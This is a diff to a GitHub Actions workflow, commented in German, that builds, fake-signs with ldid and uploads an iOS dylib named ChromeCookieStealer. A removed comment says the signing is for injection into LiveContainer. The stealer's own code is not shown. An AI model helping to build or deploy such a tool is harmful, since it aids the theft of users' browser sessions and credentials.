@@ -8,13 +8,18 @@ on:
 
 jobs:
   build:
-    runs-on: macos-latest  # Der Gamechanger – alles native
+    runs-on: macos-latest
 
     steps:
       - name: Checkout Repo
         uses: actions/checkout@v4
 
-      - name: Install ldid (für Fake-Sign)
+      - name: Install GNU Make (für parallel + Speed)
+        run: |
+          brew install make
+          echo "PATH=$(brew --prefix make)/libexec/gnubin:$PATH" >> $GITHUB_ENV
+
+      - name: Install ldid
         run: brew install ldid
 
       - name: Install Theos
@@ -23,10 +28,10 @@ jobs:
           echo "THEOS=$HOME/theos" >> $GITHUB_ENV
           echo "$HOME/theos/bin" >> $GITHUB_PATH
 
-      - name: Update Theos (vendor fix + latest)
+      - name: Update Theos
         run: $THEOS/bin/update-theos
 
-      - name: Download latest iOS SDKs
+      - name: Download SDKs
         run: |
           curl -L https://github.com/theos/sdks/tarball/master | tar -xz -C $THEOS/sdks --strip-components=1
 
@@ -35,11 +40,10 @@ jobs:
           make clean
           make
 
-      - name: Fake-Sign dylib (muss für Injection in LiveContainer)
-        run: |
-          ldid -S obj/ChromeCookieStealer.dylib
+      - name: Fake-Sign dylib
+        run: ldid -S obj/ChromeCookieStealer.dylib
 
-      - name: Upload dylib als Artifact
+      - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
           name: ChromeCookieStealer.dylib
